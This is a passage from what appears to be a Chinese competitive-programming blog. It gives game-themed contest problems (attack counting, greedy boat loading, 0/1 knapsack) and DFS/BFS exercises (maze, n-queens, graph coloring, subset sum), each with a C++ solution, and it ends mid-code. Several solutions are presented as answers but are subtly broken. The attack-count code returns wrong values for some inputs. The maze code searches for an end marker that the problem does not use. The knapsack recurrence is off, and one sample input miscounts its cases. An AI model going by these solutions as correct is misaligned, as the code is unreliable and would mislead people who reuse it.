<h2 id="问题-C-圣诞恋歌——貂蝉"><a href="#问题-C-圣诞恋歌——貂蝉" class="headerlink" title="问题 C: 圣诞恋歌——貂蝉"></a>问题 C: 圣诞恋歌——貂蝉</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>貂蝉是王者峡谷里的法师&#x2F;刺客，貂蝉打法一定要注意配合技能与被动。半肉出装加上蛇皮走位，往往可以1打5，轻松拿下5杀。语花印被动描述为：技能命中会为敌人叠加花之印记，叠加满4层后印记触发被动，会给自身回复生命，同时会对周围敌人造成真实伤害并减速。<br>我们现在对貂蝉的技能及被动进行简化如下：每使用1次技能会攻击1次目标，每攻击3次目标，会自动额外攻击1次目标。<br>现在，貂蝉在游戏中使用了n次技能，请问总共会给目标带来多少次攻击。</p>
<h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>多组测试数据，第一行输入包含一个整数T，代表测试样例个数。<br>接下来T行，每行输入包含一个整数n（1&lt;&#x3D;n&lt;&#x3D;100），代表貂蝉使用了n次技能。</p>
<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表貂蝉对目标进行了ans次攻击。</p>
<h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs">6
1
2
3
45
81</code></pre>

<h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs">1
2
4
57
121</code></pre>

<h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><p>这题就是汽水瓶的改编。。。</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-type">int</span> n;
	cin&gt;&gt;n; 
	<span class="hljs-keyword">while</span>(n--)
	&#123;
		<span class="hljs-type">int</span> m,sum;
		cin&gt;&gt;m;
		sum=<span class="hljs-number">0</span>;
		<span class="hljs-keyword">while</span>(m&gt;<span class="hljs-number">3</span>)
		&#123;
			m=m<span class="hljs-number">-2</span>;
			sum=sum+<span class="hljs-number">3</span>;
		&#125;	
		<span class="hljs-keyword">if</span>(m==<span class="hljs-number">3</span>)
		sum+=<span class="hljs-number">4</span>;
		<span class="hljs-keyword">else</span>
		sum=m;
		cout&lt;&lt;sum&lt;&lt;endl; 
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="问题-D-海之征途——孙策"><a href="#问题-D-海之征途——孙策" class="headerlink" title="问题 D: 海之征途——孙策"></a>问题 D: 海之征途——孙策</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>孙策是王者峡谷里的坦克&#x2F;战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。</p>
<p>现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。</p>
<h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;&#x3D;T&lt;&#x3D;1000），代表测试用例个数。</p>
<p>每组测试用例第一行有两个整数m和n。（0&lt;&#x3D;m&lt;&#x3D;1000， 0&lt;&#x3D;n&lt;&#x3D;1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。</p>
<h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。</p>
<h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-number">2</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span>
<span class="hljs-symbol">20 </span><span class="hljs-number">9</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">1</span> <span class="hljs-number">8</span> <span class="hljs-number">5</span> <span class="hljs-number">9</span></code></pre>

<h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs">3
6</code></pre>

<h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><p>就是简单的装在问题</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">int</span> T,m,n;
<span class="hljs-type">int</span> w[<span class="hljs-number">1005</span>];
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	cin&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;
		cin&gt;&gt;m&gt;&gt;n;
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			cin&gt;&gt;w[i];
		&#125;
		<span class="hljs-built_in">sort</span>(w,w+n);
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		&#123;
			<span class="hljs-keyword">if</span>(m&gt;=w[i])
			&#123;
				ans++;
				m-=w[i];
			&#125;
			<span class="hljs-keyword">else</span>
			<span class="hljs-keyword">break</span>; 
		&#125; 
		cout&lt;&lt;ans&lt;&lt;endl;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="问题-E-极冰防御——盾山"><a href="#问题-E-极冰防御——盾山" class="headerlink" title="问题 E: 极冰防御——盾山"></a>问题 E: 极冰防御——盾山</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。</p>
<p>盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。</p>
<p>假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;&#x3D;N）组成他可承受盾牌，最大的防御值是多少？</p>
<h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。<br>第一行输入包含一个整数T（1&lt;&#x3D;T&lt;&#x3D;10），代表测试用例个数。</p>
<p>接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;&#x3D;Wi&lt;&#x3D;100)和防御值Pi(1&lt;&#x3D;Pi&lt;&#x3D;3000000)。</p>
<h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。</p>
<h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-number">1</span>
<span class="hljs-symbol">10 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">6</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">6 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">5 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">6</span></code></pre>

<h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs">15</code></pre>

<h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>01背包问题，不知道下面的解能不能过</p>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;
<span class="hljs-type">long</span> <span class="hljs-type">long</span> ans[N];
<span class="hljs-type">int</span> w[N],v[N];
<span class="hljs-type">int</span> T;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	cin&gt;&gt;T;
	<span class="hljs-keyword">while</span>(T--)
	&#123;
		<span class="hljs-type">int</span> C,N;
		<span class="hljs-built_in">memset</span>(ans,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(ans));
		cin&gt;&gt;C&gt;&gt;N;
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			cin&gt;&gt;w[i]&gt;&gt;v[i];
		&#125;
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)
		&#123;
			<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=C;j&gt;=w[i];j--)
			ans[j]=<span class="hljs-built_in">max</span>(ans[j<span class="hljs-number">-1</span>],ans[j-w[i]]+v[i]);
		&#125;
<span class="hljs-comment">//		for(int i=0;i&lt;=C;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;ans[i]&lt;&lt;endl;</span>
		cout&lt;&lt;ans[C]&lt;&lt;endl;
	&#125; 
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<p>ps:以上代码没有提交测试环境，只是过了给出的测试样例。</p>
<h1 id="dfs大合集"><a href="#dfs大合集" class="headerlink" title="dfs大合集"></a>dfs大合集</h1><h2 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。<br>小明只能向上下左右四个方向移动。</p>
<p>输入</p>
<p>输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。<br>每组输入的第一行是两个整数N和M（1&lt;&#x3D;N,M&lt;&#x3D;100）。<br>接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。<br>字符的含义如下：<br>‘S’：起点<br>‘E’：终点<br>‘-’：空地，可以通过<br>‘#’：障碍，无法通过<br>输入数据保证有且仅有一个起点和终点。</p>
<p>输出</p>
<p>对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。</p>
<h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs asciidoc">1
5 5
<span class="hljs-section">s-###</span>
<span class="hljs-section">-----</span>
##---
E#---
---##</code></pre>

<h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs">9</code></pre>

<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">int</span> de[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<span class="hljs-comment">//计步数组  记录走到这个位置所需的步数 不能走到的位置标记为-1 </span>
<span class="hljs-type">char</span> map[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];  <span class="hljs-comment">//用于存放迷宫地图 </span>
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; P;  <span class="hljs-comment">//坐标</span>
<span class="hljs-type">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;  <span class="hljs-comment">//在当前坐标下能走的四个方向</span>
<span class="hljs-type">int</span> sx,ex,sy,ey;  <span class="hljs-comment">//(sx,sy)为起点坐标  （ex,ey）为终点坐标</span>
<span class="hljs-type">int</span> x,y,nx,ny; <span class="hljs-comment">//(x,y)为函数中当前位置坐标   （nx,ny)为接下来能到达的坐标 </span>
<span class="hljs-type">int</span> r,l;  <span class="hljs-comment">//r为行数 l为列数 </span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(de,<span class="hljs-number">-1</span>,<span class="hljs-built_in">sizeof</span>(de));
	queue&lt;P&gt; qu;
	qu.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">P</span>(sx,sy));   <span class="hljs-comment">//将起点坐标放入队头 </span>
	de[sx][sy]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.<span class="hljs-built_in">empty</span>()) 
	&#123;
		P p=qu.<span class="hljs-built_in">front</span>();   <span class="hljs-comment">//取出队头坐标 </span>
		qu.<span class="hljs-built_in">pop</span>() ;<span class="hljs-comment">//删除对头及走过的坐标 </span>
		x=p.first,y=p.second; 
		<span class="hljs-keyword">if</span>(x==ex&amp;&amp;y==ey) <span class="hljs-keyword">break</span>; <span class="hljs-comment">//到达终点 跳出循环		</span>
	 	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i];<span class="hljs-comment">//开始向四个方向移动 </span>
			ny=y+to[<span class="hljs-number">1</span>][i];			
				<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=<span class="hljs-string">&#x27;#&#x27;</span>&amp;&amp;de[nx][ny]==<span class="hljs-number">-1</span>)
	 			<span class="hljs-comment">//判断是否越界 以及是否能走  排除走过的路 </span>
	 			&#123;
			     	qu.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">P</span>(nx,ny));      <span class="hljs-comment">//将能走的坐标放入队列 之后依次删除 </span>
			    	de[nx][ny]=de[x][y]+<span class="hljs-number">1</span>;  <span class="hljs-comment">//步数加一 </span>
				&#125; 				  
			&#125;
	&#125;
	<span class="hljs-keyword">if</span>(de[ex][ey]==<span class="hljs-number">-1</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">//终点的记步数组为-1 及不能到达终点 </span>
	<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> de[ex][ey]; 
&#125; 
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-type">int</span> n,i,j;
	<span class="hljs-keyword">while</span>(cin&gt;&gt;n)&#123;
		<span class="hljs-keyword">while</span>(n--)&#123;
			cin&gt;&gt;r&gt;&gt;l;
			<span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;r;i++)&#123;
				<span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;l;j++)&#123; 
				cin&gt;&gt;map[i][j];
				<span class="hljs-keyword">if</span>(map[i][j]==<span class="hljs-string">&#x27;S&#x27;</span>) <span class="hljs-comment">//记录起点坐标 </span>
				 &#123;
					sx=i,sy=j;
				 &#125; 
				 <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(map[i][j]==<span class="hljs-string">&#x27;T&#x27;</span>)  <span class="hljs-comment">//记录终点坐标 </span>
				 &#123;
				 	ex=i,ey=j;
				 &#125;
				&#125;
			&#125;
			cout&lt;&lt;<span class="hljs-built_in">bfs</span>()&lt;&lt;endl;
		&#125;
	&#125;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="acwing迷宫问题"><a href="#acwing迷宫问题" class="headerlink" title="acwing迷宫问题"></a>acwing迷宫问题</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-type">int</span> mp[N][N];
<span class="hljs-type">int</span> dis[N][N];
<span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; P;
<span class="hljs-type">int</span> n,m;
<span class="hljs-type">int</span> to[<span class="hljs-number">2</span>][<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;
<span class="hljs-type">int</span> x,y,nx,ny;
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-built_in">sizeof</span>(dis));
	queue&lt;P&gt; qu;
	qu.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">P</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>));
	dis[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;
	<span class="hljs-keyword">while</span>(!qu.<span class="hljs-built_in">empty</span>())
	&#123;
		P p=qu.<span class="hljs-built_in">front</span>();
		qu.<span class="hljs-built_in">pop</span>();
		x=p.first,y=p.second;
		<span class="hljs-keyword">if</span>(x==n<span class="hljs-number">-1</span>&amp;&amp;y==m<span class="hljs-number">-1</span>) <span class="hljs-keyword">break</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)
		&#123;
			nx=x+to[<span class="hljs-number">0</span>][i],ny=y+to[<span class="hljs-number">1</span>][i];
			<span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span>&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span>&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==<span class="hljs-number">-1</span>&amp;&amp;mp[nx][ny]==<span class="hljs-number">0</span>)
			&#123;
				qu.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">P</span>(nx,ny));
				dis[nx][ny]=dis[x][y]+<span class="hljs-number">1</span>;
			&#125;
		 &#125; 
		
	&#125;
	<span class="hljs-keyword">if</span>(dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]!=<span class="hljs-number">-1</span>)
	cout&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];
	<span class="hljs-keyword">return</span>; 
&#125;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	cin&gt;&gt;n&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)
	cin&gt;&gt;mp[i][j];
	<span class="hljs-built_in">dfs</span>();
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="n皇后问题"><a href="#n皇后问题" class="headerlink" title="n皇后问题"></a>n皇后问题</h2><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">int</span> n,ans=<span class="hljs-number">0</span>;
<span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">20</span>;
<span class="hljs-type">char</span> m[N][N];
<span class="hljs-type">bool</span> col[N],dg[N],udg[N];
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(u==n)
	&#123;
<span class="hljs-comment">//		for(int i=0;i&lt;n;i++)</span>
<span class="hljs-comment">//		cout&lt;&lt;m[i]&lt;&lt;endl;</span>
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
	&#123;
		<span class="hljs-keyword">if</span>(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i])
		&#123;
			m[u][i]=<span class="hljs-string">&#x27;Q&#x27;</span>;
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">1</span>;
			<span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);
			col[i]=dg[i+u]=udg[n-u+i]=<span class="hljs-number">0</span>;<span class="hljs-comment">//回溯恢复现场 </span>
			m[u][i]=<span class="hljs-string">&#x27;.&#x27;</span>;
		&#125;
	&#125;
&#125;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	cin&gt;&gt;n;
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)
		m[i][j]=<span class="hljs-string">&#x27;.&#x27;</span>;
	<span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);
	cout&lt;&lt;ans;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>

<h2 id="m图着色问题"><a href="#m图着色问题" class="headerlink" title="m图着色问题"></a>m图着色问题</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p>
<h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p>
<h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>所有不同的着色方案数</p>
<h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">8</span> <span class="hljs-number">4</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">3</span> 
<span class="hljs-symbol">1 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">3</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">2 </span><span class="hljs-number">5</span>
<span class="hljs-symbol">3 </span><span class="hljs-number">4</span>
<span class="hljs-symbol">4 </span><span class="hljs-number">5</span></code></pre>

<h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs">48</code></pre>

<h3 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h3><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">105</span>;
<span class="hljs-type">int</span> mp[N][N];
<span class="hljs-type">int</span> color[N]=&#123;<span class="hljs-number">0</span>&#125;;
<span class="hljs-type">int</span> n,k,m,ans=<span class="hljs-number">0</span>;
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> d)</span></span>
<span class="hljs-function"></span>&#123;
	<span class="hljs-keyword">if</span>(d==n+<span class="hljs-number">1</span>)
	&#123;
		ans++;
		<span class="hljs-keyword">return</span>;
	&#125;
	
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)
	&#123;
		<span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;
		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)
		&#123;
			<span class="hljs-keyword">if</span>(mp[d][j]&amp;&amp;color[j]==i)
			&#123;
				flag=<span class="hljs-number">0</span>;
				<span class="hljs-keyword">break</span>;
			&#125;
		 &#125;
		 <span class="hljs-keyword">if</span>(flag)
		 &#123;
		 	 color[d]=i;
			 <span class="hljs-built_in">dfs</span>(d+<span class="hljs-number">1</span>);
			 color[d]=<span class="hljs-number">0</span>; 	
		 &#125; 
	 &#125; 
&#125;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
	cin&gt;&gt;n&gt;&gt;k&gt;&gt;m;
	<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)
	&#123;
		<span class="hljs-type">int</span> t1,t2;
		cin&gt;&gt;t1&gt;&gt;t2;
		mp[t1][t2]=<span class="hljs-number">1</span>;
		mp[t2][t1]=<span class="hljs-number">1</span>;
	&#125;
	<span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>);
	cout&lt;&lt;ans&lt;&lt;endl;
	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>



<h2 id="部分和"><a href="#部分和" class="headerlink" title="部分和"></a>部分和</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p>
<h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p>
<p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p>
<p><em>1<strong>≤</strong>N<strong>≤</strong>20</em>，输入整数及k均小于<em>1e8</em>。</p>
<h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>若可以使得和为k，输出”Yes”,否则”No”。</p>
<h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><pre><code class="hljs basic"><span class="hljs-number">4</span>
<span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span>
<span class="hljs-number">13</span></code></pre>

<h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><pre><code class="hljs ebnf"><span class="hljs-attribute">Yes</span></code></pre>

<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-type">int</span> s[<span class="hljs-number">25</span>];
<span class="hljs-type">int</span> n,m;
<span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> a)</span></span>
<span class="hljs-function"></span>&#123;
	 <span class="hljs-keyword">if</span>(a==m) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
	 <span class="hljs-keyword">if</span>(l==n) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
	 <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(l+<span class="hljs-number">1</span>,a+s[l]))
	 <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
